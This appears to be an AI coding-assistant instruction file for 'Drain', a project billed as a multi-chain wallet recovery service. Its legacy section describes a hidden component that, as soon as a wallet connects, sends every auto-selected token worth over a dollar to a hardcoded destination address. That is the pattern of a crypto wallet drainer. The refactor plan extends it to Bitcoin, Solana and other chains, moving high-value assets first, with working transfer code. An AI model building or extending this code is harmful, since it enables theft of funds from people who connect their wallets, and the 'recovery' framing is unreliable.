# Drain - Copilot Instructions

## Project Overview
Drain is a multi-chain asset recovery service that enables users to quickly transfer all tokens/assets from one wallet to another. Built for emergency situations (getting hacked) or portfolio consolidation. Supports EVM chains (Ethereum, Polygon, BSC, etc.), Bitcoin, Solana, and other major networks.

## Architecture Overview

### Why Backend-First Architecture?
Browser-based bulk transfers have critical limitations:
- **Gas limits**: Sequential browser transactions are slow and expensive
- **Reliability**: Page refresh loses progress, no automatic retry
- **Network congestion**: Failed transactions require manual intervention
- **Cross-chain complexity**: Each chain needs different handling (EVM vs UTXO vs Solana)
- **Security**: Private keys should never be in browser for bulk operations

### System Components

```
┌─────────────────┐
│  Frontend (Next.js)  │
│  - Wallet connection │
│  - Submit requests   │
│  - Monitor progress  │
└──────┬──────────┘
       │ HTTP/WebSocket
┌──────▼──────────┐
│  API Server     │
│  - Auth/signing  │
│  - Job creation  │
│  - Status updates│
└──────┬──────────┘
       │
┌──────▼──────────┐
│  Job Queue      │
│  (Bull/Redis)   │
└──────┬──────────┘
       │
┌──────▼──────────────────────┐
│  Worker Processes (Multi-chain)  │
│  ├─ EVM Handler (ethers.js)  │
│  ├─ BTC Handler (bitcoinjs)  │
│  ├─ SOL Handler (@solana/web3)│
│  └─ Retry/Batch logic        │
└────────────────────────────┘
```

## Current State (Frontend-Only) - Legacy

### Legacy Architecture & Key Components

### State Management (Jotai)
- **Global state atoms** in `src/atoms/`:
  - `globalTokensAtom`: Array of ERC-20 tokens with balances and quotes
  - `checkedTokensAtom`: Record mapping token addresses to `{isChecked, pendingTxn}` status
  - `destinationAddressAtom`: Target wallet address for transfers
- **Pattern**: Use `useAtom()` hook for read/write access to atoms

### Multi-Chain Support (wagmi + RainbowKit)
- **Supported chains** (see `pages/_app.tsx`):
  - Mainnet, Polygon, Optimism, Arbitrum, Avalanche, BSC, Gnosis, Mumbai testnet
- **Configuration**: Uses Alchemy provider + public provider fallback
- **Environment variables required**:
  - `NEXT_PUBLIC_ALCHEMY_ID`: Alchemy API key
  - `NEXT_PUBLIC_PROJECT_ID`: WalletConnect project ID (for RainbowKit)
  - `NEXT_PUBLIC_DESTINATION_ADDRESS`: Hardcoded destination wallet

### Token Fetching (`src/fetch-tokens.ts`)
- **API**: Covalent API (`api.covalenthq.com`) for token balances
- **Filtering logic**:
  1. Excludes "dust" type tokens
  2. Only includes `cryptocurrency` and `stablecoin` types
  3. Requires non-null price quotes (`quote`, `quote_rate`, etc.)
  4. Minimum USD value: `item.quote > 1`
  5. Blacklist filtering (see `src/token-lists.ts`)
- **Returns**: `{erc20s, nfts}` where erc20s match the `Tokens` type

### Token Transfer Flow (`components/contract/SendTokens.tsx`)
1. **Auto-execution**: `useEffect` automatically calls `sendAllCheckedTokens()` on mount
2. **Gas estimation**: Uses `estimateGas.transfer()` with 2x multiplier for safety
3. **Transaction sequencing**: Iterates through checked tokens, sending one by one
4. **State updates**: Updates `checkedTokensAtom` with `pendingTxn` object after each transfer
5. **Error handling**: Shows toast notification on transfer errors

### Component Structure
- **GetTokens**: Fetches and displays tokens with toggles (auto-checked), handles loading/error states
- **SendTokens**: Hidden UI, auto-sends all checked tokens to hardcoded destination on mount
- **Token filtering**: Balance display uses `tinyBig` from `essential-eth` for precision

## Development Workflows

### Running the app
```bash
npm run dev      # Start dev server on localhost:3000
npm run build    # Production build
npm run start    # Production server
npm run lint     # ESLint
```

### Adding new chains
1. Import chain from `@wagmi/chains` in `_app.tsx`
2. Add to `configureChains()` array
3. Update Covalent API calls if chain ID mapping differs

### Modifying token filters
- Edit `fetchTokens()` filter predicates in `src/fetch-tokens.ts`
- Add addresses to `blacklistAddresses` array in `src/token-lists.ts`

## Code Conventions

### Import organization
- Uses `prettier-plugin-organize-imports` (runs on save)
- External imports → Internal imports → Relative imports

### TypeScript
- **Path alias**: `@/*` maps to workspace root (see `tsconfig.json`)
- Strict mode enabled
- Use existing types from `src/types/` (e.g., `TransferPending`)

### Styling
- **Tailwind CSS**: Utility-first classes (see `tailwind.config.js`)
- **Geist UI**: Component library for buttons, inputs, loading states, toasts
- Uses inline `style` props for one-off styles (see `pages/index.tsx`)

### wagmi patterns
```typescript
// Hooks used throughout
const { address, isConnected } = useAccount();
const { chain } = useNetwork();
const { data: signer } = useSigner();
const { isLoading, isSuccess } = useWaitForTransaction({ hash });
```

## Critical Implementation Details

### ERC-20 Transfer Pattern
```typescript
const erc20Contract = new ethers.Contract(tokenAddress, erc20ABI, signer);
const amountToTransfer = ethers.utils.parseUnits(token?.balance ?? '0', 18);
const gasLimit = await erc20Contract.estimateGas.transfer(dest, amount);
const tx = await erc20Contract.populateTransaction.transfer(dest, amount, {
  gasLimit: gasLimit.mul(2)
});
const response = await signer?.sendTransaction(tx);
```

### Hydration handling
- `useIsMounted` hook prevents SSR/CSR mismatch
- Check `if (!isMounted) return null` before rendering wallet-connected UI

### Token balance precision
- Use `tinyBig()` from `essential-eth` for decimal math
- Apply conditional rounding based on balance magnitude (see `GetTokens.tsx` lines 38-44)

## Environment Setup
Create `.env.local`:
```
NEXT_PUBLIC_ALCHEMY_ID=your_alchemy_key
NEXT_PUBLIC_PROJECT_ID=your_walletconnect_project_id
NEXT_PUBLIC_DESTINATION_ADDRESS=0x...
```

## Debugging Tips (Legacy Frontend)
- Check browser console for Covalent API errors (chain not supported message)
- Verify wallet connection state via RainbowKit modal
- Monitor `checkedTokensAtom` updates for transfer state tracking
- Gas estimation failures usually indicate insufficient token balance or contract issues

---

## Refactored Backend Architecture (Recommended)

### Technology Stack

#### Backend Services
- **API Server**: Express/Fastify with TypeScript
- **Job Queue**: Bull (Redis-backed) for reliable processing
- **Database**: PostgreSQL for job history, transaction logs
- **Cache**: Redis for rate limiting, temporary state
- **Monitoring**: Prometheus + Grafana for observability

#### Multi-Chain Support
```typescript
// Chain Handler Interface
interface ChainHandler {
  network: 'evm' | 'btc' | 'solana' | 'cosmos';
  fetchBalances(address: string): Promise<Asset[]>;
  transferAsset(asset: Asset, to: string, privateKey: string): Promise<TxHash>;
  estimateFees(asset: Asset): Promise<FeeEstimate>;
  batchTransfer?(assets: Asset[], to: string): Promise<TxHash[]>;
}
```

**EVM Chains** (Ethereum, Polygon, BSC, Arbitrum, Optimism, Avalanche):
- Library: `ethers.js` or `viem`
- Batch transfers via Multicall or custom batch contract
- RPC providers: Alchemy, Infura, QuickNode
- Token detection: Covalent API, Moralis, or direct RPC calls

**Bitcoin**:
- Library: `bitcoinjs-lib`, `@scure/btc-signer`
- UTXO-based: Fetch all UTXOs, consolidate to destination
- Fee estimation: Dynamic based on mempool state
- API: Blockstream, Blockchain.com, or self-hosted node

**Solana**:
- Library: `@solana/web3.js`, `@solana/spl-token`
- Token accounts: Fetch all SPL tokens, close accounts after transfer
- Transaction versioning: Use v0 transactions with lookup tables
- RPC: Helius, QuickNode, or public endpoints

**Cosmos Ecosystem** (ATOM, OSMO, etc.):
- Library: `@cosmjs/stargate`
- IBC transfers for cross-chain assets
- Multi-chain support via chain registry

**Other Networks**:
- **Tron**: `tronweb` for TRC-20 tokens
- **Near**: `near-api-js`
- **Aptos/Sui**: Native SDKs

### Backend Service Structure

```
backend/
├── src/
│   ├── api/
│   │   ├── routes/
│   │   │   ├── drain.routes.ts      # POST /drain/request
│   │   │   ├── status.routes.ts     # GET /drain/:jobId
│   │   │   └── history.routes.ts    # GET /drain/history
│   │   ├── middleware/
│   │   │   ├── auth.middleware.ts   # Signature verification
│   │   │   └── rateLimit.middleware.ts
│   │   └── controllers/
│   ├── chains/
│   │   ├── base/
│   │   │   └── ChainHandler.ts
│   │   ├── evm/
│   │   │   ├── EVMHandler.ts
│   │   │   ├── tokenDetection.ts
│   │   │   └── batchTransfer.ts
│   │   ├── btc/
│   │   │   ├── BTCHandler.ts
│   │   │   └── utxoConsolidation.ts
│   │   ├── solana/
│   │   │   ├── SolanaHandler.ts
│   │   │   └── splTokens.ts
│   │   └── registry.ts              # Chain configuration
│   ├── workers/
│   │   ├── drainWorker.ts           # Main job processor
│   │   ├── retryWorker.ts           # Failed tx retry
│   │   └── monitorWorker.ts         # Tx confirmation
│   ├── services/
│   │   ├── encryption.service.ts    # Private key encryption
│   │   ├── notification.service.ts  # Email/Discord alerts
│   │   └── analytics.service.ts     # Usage tracking
│   ├── db/
│   │   ├── models/
│   │   │   ├── DrainJob.model.ts
│   │   │   └── Transaction.model.ts
│   │   └── migrations/
│   └── utils/
│       ├── logger.ts
│       └── errors.ts
├── docker-compose.yml
└── package.json
```

### Frontend Refactor (Next.js Dashboard)

```
frontend/
├── pages/
│   ├── index.tsx                    # Dashboard overview
│   ├── drain/
│   │   ├── new.tsx                  # Create drain request
│   │   └── [jobId].tsx              # Monitor specific job
│   └── api/
│       └── [...].ts                 # Proxy to backend
├── components/
│   ├── wallet/
│   │   ├── WalletConnect.tsx        # Multi-chain wallet connection
│   │   └── SignatureRequest.tsx     # Message signing for auth
│   ├── drain/
│   │   ├── AssetList.tsx            # Display detected assets
│   │   ├── ChainSelector.tsx        # Multi-chain selection
│   │   ├── ProgressMonitor.tsx      # Real-time job status
│   │   └── TransactionHistory.tsx   # Completed drains
│   └── shared/
└── lib/
    ├── api/
    │   └── drainApi.ts              # Backend API client
    └── hooks/
        ├── useDrainJob.ts           # Job status polling
        └── useWalletAuth.ts         # Signature-based auth
```

### Key Implementation Patterns

#### 1. Authentication Flow
```typescript
// User signs message with wallet
const message = `Authorize drain from ${address} at ${timestamp}`;
const signature = await signer.signMessage(message);

// Backend verifies signature
const recoveredAddress = ethers.utils.verifyMessage(message, signature);
if (recoveredAddress === address && isTimestampValid(timestamp)) {
  // Create JWT or session
}
```

#### 2. Job Creation
```typescript
POST /api/drain/request
{
  "network": "ethereum",
  "sourceAddress": "0x...",
  "destinationAddress": "0x...",
  "assets": ["all"] | ["0xToken1", "0xToken2"],
  "signature": "0x...",  // Signed authorization
  "options": {
    "maxGasPrice": "50",  // Gwei
    "batchSize": 10,
    "prioritize": ["USDC", "WETH"]
  }
}

Response:
{
  "jobId": "drain_abc123",
  "status": "queued",
  "estimatedTime": "5-10 minutes",
  "estimatedCost": {
    "totalGas": "0.05 ETH",
    "breakdown": [...]
  }
}
```

#### 3. Worker Processing
```typescript
// drainWorker.ts
drainQueue.process(async (job) => {
  const { network, sourceAddress, destinationAddress, assets } = job.data;
  
  const handler = getChainHandler(network);
  const balances = await handler.fetchBalances(sourceAddress);
  
  // Filter and prioritize
  const toTransfer = balances
    .filter(asset => assets === 'all' || assets.includes(asset.address))
    .sort((a, b) => b.usdValue - a.usdValue);  // High value first
  
  // Process with retry logic
  for (const asset of toTransfer) {
    try {
      const txHash = await handler.transferAsset(asset, destinationAddress);
      await job.updateProgress({
        transferred: [...progress.transferred, { asset, txHash }]
      });
    } catch (error) {
      if (isRetryable(error)) {
        await retryQueue.add({ asset, attempt: 1 }, { delay: 60000 });
      }
    }
  }
});
```

#### 4. Real-time Progress (WebSocket)
```typescript
// Frontend
const socket = io(`${API_URL}/drain`);
socket.on(`job:${jobId}`, (update) => {
  // Update UI: progress bar, transaction list
  setJobStatus(update);
});

// Backend
io.to(`job:${jobId}`).emit('job:update', {
  status: 'processing',
  progress: 45,
  completedTxs: 9,
  totalTxs: 20,
  currentAsset: 'USDC'
});
```

### Multi-Chain Implementation Examples

#### EVM Batch Transfer
```typescript
// Use Multicall3 for gas efficiency
const multicall = new ethers.Contract(MULTICALL3_ADDRESS, ABI, signer);

const calls = tokens.map(token => ({
  target: token.address,
  callData: ERC20.encodeFunctionData('transfer', [destAddress, token.amount])
}));

const tx = await multicall.aggregate3(calls);
```

#### Bitcoin UTXO Consolidation
```typescript
const utxos = await fetchUTXOs(address);
const psbt = new bitcoin.Psbt({ network });

// Add all inputs
utxos.forEach(utxo => {
  psbt.addInput({
    hash: utxo.txid,
    index: utxo.vout,
    witnessUtxo: {
      script: addressToOutputScript(address),
      value: utxo.value
    }
  });
});

// Single output (consolidation)
const totalValue = utxos.reduce((sum, u) => sum + u.value, 0);
const fee = estimateFee(utxos.length, 1);
psbt.addOutput({
  address: destinationAddress,
  value: totalValue - fee
});
```

#### Solana SPL Token Transfer
```typescript
const connection = new Connection(SOLANA_RPC);
const sourceTokenAccounts = await connection.getParsedTokenAccountsByOwner(
  sourcePublicKey,
  { programId: TOKEN_PROGRAM_ID }
);

const instructions = [];
for (const account of sourceTokenAccounts.value) {
  const amount = account.account.data.parsed.info.tokenAmount.amount;
  if (amount > 0) {
    instructions.push(
      createTransferInstruction(
        account.pubkey,
        destTokenAccount,
        sourcePublicKey,
        amount
      )
    );
  }
}

// Send as single transaction or multiple if too large
const tx = new Transaction().add(...instructions);
```

### Environment Variables (Backend)

```bash
# API Configuration
PORT=3001
NODE_ENV=production
API_KEY_SECRET=xxx

# Database
DATABASE_URL=postgresql://user:pass@localhost:5432/drain
REDIS_URL=redis://localhost:6379

# RPC Endpoints
ALCHEMY_KEY=xxx
INFURA_KEY=xxx
QUICKNODE_URL=https://xxx
HELIUS_API_KEY=xxx  # Solana

# Chain RPCs
ETHEREUM_RPC=https://eth-mainnet.alchemyapi.io/v2/${ALCHEMY_KEY}
POLYGON_RPC=https://polygon-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}
BSC_RPC=https://bsc-dataseed.binance.org
SOLANA_RPC=https://api.mainnet-beta.solana.com
BITCOIN_RPC=https://blockstream.info/api

# External APIs
COVALENT_API_KEY=xxx
MORALIS_API_KEY=xxx

# Security
ENCRYPTION_KEY=xxx  # For encrypting sensitive data at rest
JWT_SECRET=xxx

# Monitoring
SENTRY_DSN=xxx
PROMETHEUS_PORT=9090
```

### Deployment Strategy

#### Docker Compose (Development)
```yaml
version: '3.8'
services:
  api:
    build: ./backend
    ports:
      - "3001:3001"
    environment:
      - DATABASE_URL=postgresql://postgres:password@db:5432/drain
      - REDIS_URL=redis://redis:6379
    depends_on:
      - db
      - redis
  
  worker:
    build: ./backend
    command: node dist/workers/drainWorker.js
    environment:
      - REDIS_URL=redis://redis:6379
    depends_on:
      - redis
  
  db:
    image: postgres:15
    volumes:
      - postgres_data:/var/lib/postgresql/data
  
  redis:
    image: redis:7-alpine
    
  frontend:
    build: ./frontend
    ports:
      - "3000:3000"
    environment:
      - NEXT_PUBLIC_API_URL=http://localhost:3001
```

#### Production (Kubernetes/Cloud Run)
- **API**: Horizontal scaling based on CPU/memory
- **Workers**: Auto-scale based on queue depth
- **Database**: Managed PostgreSQL (RDS, Cloud SQL)
- **Redis**: Managed Redis (ElastiCache, Memorystore)
- **Secrets**: Vault or cloud secret manager

### Migration Path from Current Codebase

1. **Phase 1**: Extract chain logic
   - Move `fetch-tokens.ts` to backend service
   - Create EVM handler with existing ethers.js code
   - Add job queue for single-chain (Ethereum) support

2. **Phase 2**: Add multi-chain
   - Implement Bitcoin handler
   - Implement Solana handler
   - Add chain registry and unified API

3. **Phase 3**: Frontend refactor
   - Keep wallet connection UI
   - Replace direct transfers with job submission
   - Add progress monitoring dashboard

4. **Phase 4**: Advanced features
   - Batch optimization
   - MEV protection
   - Cross-chain routing

### Testing Strategy

```typescript
// Integration test example
describe('Drain Job Processing', () => {
  it('should transfer all ERC-20 tokens', async () => {
    const job = await createDrainJob({
      network: 'ethereum',
      sourceAddress: TEST_ADDRESS,
      destinationAddress: DEST_ADDRESS
    });
    
    await processJob(job);
    
    const finalBalances = await fetchBalances(TEST_ADDRESS);
    expect(finalBalances.every(b => b.amount === '0')).toBe(true);
  });
});
```

### Security Considerations

1. **Private Key Handling**:
   - Never store private keys in database
   - Use ephemeral in-memory processing
   - Consider Hardware Security Modules (HSM) for high-value operations
   - Implement key derivation for sub-accounts

2. **Rate Limiting**:
   - Per-address limits to prevent abuse
   - Global rate limits per chain
   - Exponential backoff on failures

3. **Transaction Safety**:
   - Dry-run simulations before execution
   - Maximum gas price limits
   - Slippage protection for swaps
   - Multi-sig support for high-value drains

4. **Monitoring & Alerts**:
   - Failed transaction alerts
   - Unusual activity detection
   - Cost anomaly alerts
   - Stuck transaction monitoring

### Performance Optimizations

1. **Parallel Processing**: Process independent chains simultaneously
2. **Transaction Batching**: Use Multicall/batch contracts where available
3. **Priority Queue**: High-value assets first
4. **Gas Optimization**: Dynamic gas price strategies
5. **Caching**: Cache token metadata, chain configs

### Cost Estimation

Before executing, provide users with:
- Total gas cost across all chains
- Per-transaction breakdown
- Alternative strategies (batching vs sequential)
- Time estimates (fast vs economical)

This refactored architecture provides:
✅ Reliability through job queues and retry logic
✅ Scalability across multiple chains
✅ Better UX with progress monitoring
✅ Lower failure rates
✅ Production-ready monitoring and observability
